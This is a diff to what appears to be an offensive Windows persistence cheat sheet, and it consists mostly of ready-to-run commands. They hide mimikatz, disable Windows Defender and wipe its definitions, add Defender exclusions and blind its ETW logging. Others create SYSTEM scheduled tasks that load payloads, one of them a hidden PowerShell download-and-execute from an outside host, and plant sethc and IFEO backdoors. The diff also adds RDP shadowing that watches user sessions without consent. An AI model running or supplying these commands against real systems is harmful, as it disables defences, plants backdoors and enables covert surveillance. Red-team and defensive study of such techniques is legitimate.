@@ -3,6 +3,7 @@
 ## Summary
 
 * [Tools](#tools)
+* [Hide Your Binary](#hide-your-binary)
 * [Disable Windows Defender](#disable-windows-defender)
 * [Disable Windows Firewall](#disable-windows-firewall)
 * [Simple User](#simple-user)
@@ -17,6 +18,7 @@
     * [Registry HKLM](#registry-hklm)
         * [Winlogon Helper DLL](#)
         * [GlobalFlag](#)
+    * [Startup Elevated](#startup-elevated)
     * [Services Elevated](#services-elevated)
     * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
@@ -25,6 +27,7 @@
     * [RDP Backdoor](#rdp-backdoor)
         * [utilman.exe](#utilman.exe)
         * [sethc.exe](#sethc.exe)
+    * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
 * [References](#references)
 
@@ -33,12 +36,33 @@
 
 - [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
+## Hide Your Binary
+
+> Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
+
+```ps1
+PS> attrib +h mimikatz.exe
+```
+
 ## Disable Windows Defender
 
 ```powershell
+# Disable Defender
 sc config WinDefend start= disabled
 sc stop WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
+
+## Exclude a process / location
+Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+Add-MpPreference -ExclusionPath C:\Video, C:\install
+
+# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
 ```
 
 ## Disable Windows Firewall
@@ -215,6 +239,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
 
+### Startup Elevated
+
+Create a batch script in the user startup folder.
+
+```powershell
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+```
 
 ### Services Elevated
 
@@ -253,6 +284,7 @@ Register-ScheduledTask "Backdoor" -InputObject $D
 # Native schtasks
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]
 
 ##(X86) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
@@ -312,6 +344,31 @@ Hit F5 a bunch of times when you are at the RDP login screen.
 
 ```powershell
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+```
+
+### Remote Desktop Services Shadowing
+
+:warning: FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.
+
+Requirements:
+* RDP must be running
+
+```powershell
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
+# 4 – View Session without user’s permission.
+
+# Allowing remote connections to this computer
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+# Disable UAC remote restriction
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
+# /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;
+# /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee’s session ID;
+# /noconsentprompt parameter allows to bypass a shadowee’s permission and shadow their session without their consent;
+# /prompt parameter is used to specify a user’s credentials to connect to a remote host.
 ```
 
 ### Skeleton Key
